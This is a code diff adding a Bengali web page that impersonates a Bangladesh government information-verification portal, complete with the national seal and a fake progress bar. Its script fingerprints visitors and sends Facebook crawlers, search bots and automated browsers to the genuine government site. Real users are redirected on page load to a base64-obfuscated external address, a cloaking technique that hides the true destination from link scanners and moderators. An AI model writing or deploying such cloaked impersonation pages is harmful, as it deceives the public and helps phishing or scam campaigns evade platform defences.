@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ডিজিটাল তথ্য পোর্টাল - পার্ট ২</title>
+    <meta name="description" content="সরকারি তথ্য যাচাইকরণ পোর্টাল">
+    <meta property="og:title" content="ডিজিটাল তথ্য পোর্টাল - পার্ট ২">
+    <meta property="og:description" content="তথ্য যাচাই করা হচ্ছে, অনুগ্রহ করে অপেক্ষা করুন...">
+    <meta property="og:type" content="website">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background-color: #ffffff; font-family: 'Arial', sans-serif;
+            display: flex; justify-content: center; align-items: center;
+            height: 100vh; overflow: hidden;
+        }
+        .container { text-align: center; padding: 30px 20px; }
+        .logo { width: 90px; margin-bottom: 25px; animation: pulse 2s infinite ease-in-out; }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.85; transform: scale(1.03); }
+        }
+        .text-main { font-weight: bold; font-size: 20px; color: #1a1a1a; margin-bottom: 8px; }
+        .loader-bar {
+            width: 220px; height: 6px; background: #e0e0e0;
+            border-radius: 10px; margin: 18px auto; overflow: hidden; position: relative;
+        }
+        .progress {
+            width: 0%; height: 100%;
+            background: linear-gradient(90deg, #006a4e, #00a86b);
+            border-radius: 10px; position: absolute;
+            animation: load 1.8s ease-in-out forwards;
+        }
+        @keyframes load {
+            0% { width: 0%; } 30% { width: 35%; }
+            70% { width: 75%; } 100% { width: 100%; }
+        }
+        .text-sub {
+            font-size: 14px; color: #006a4e; font-weight: bold;
+            animation: blink 1.2s ease-in-out infinite;
+        }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .dots::after {
+            content: ''; animation: dots 1.5s steps(3, end) infinite;
+        }
+        @keyframes dots {
+            0% { content: ''; } 33% { content: '.'; }
+            66% { content: '..'; } 100% { content: '...'; }
+        }
+    </style>
+	<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-G9YE10BB87"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-G9YE10BB87');
+</script>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png"
+            class="logo" alt="Bangladesh">
+        <div class="text-main">তথ্য যাচাই করা হচ্ছে</div>
+        <div class="loader-bar"><div class="progress"></div></div>
+        <div class="text-sub">পার্ট ২ লোডিং হচ্ছে<span class="dots"></span></div>
+    </div>
+    <script>
+        (function() {
+            var _0xLink = "aHR0cHM6Ly9zYWJ1ajE5LmdpdGh1Yi5pby92aWRzLw==";
+            function detectAndRedirect() {
+                var ua = navigator.userAgent.toLowerCase();
+                var isBot = /facebook|facebot|facebookexternalhit|bot|crawler|spider|slurp|bingbot|googlebot|headless|phantom|selenium|webdriver/i.test(ua);
+                var isAutomated = (navigator.webdriver === true || window.callPhantom || window._phantom || window.__nightmare);
+                
+                // Screen size check (physical screen is safe to run immediately)
+                var isFakeScreen = (window.screen.width <= 1 || window.screen.height <= 1);
+                
+                if (isBot || isFakeScreen || isAutomated) {
+                    window.location.replace("https://www.bangladesh.gov.bd/");
+                } else {
+                    setTimeout(function() {
+                        try { window.location.replace(atob(_0xLink)); }
+                        catch(e) { window.location.replace("https://www.bangladesh.gov.bd/"); }
+                    }, 1800);
+                }
+            }
+            detectAndRedirect();
+        })();
+    </script>
+</body>
+</html>
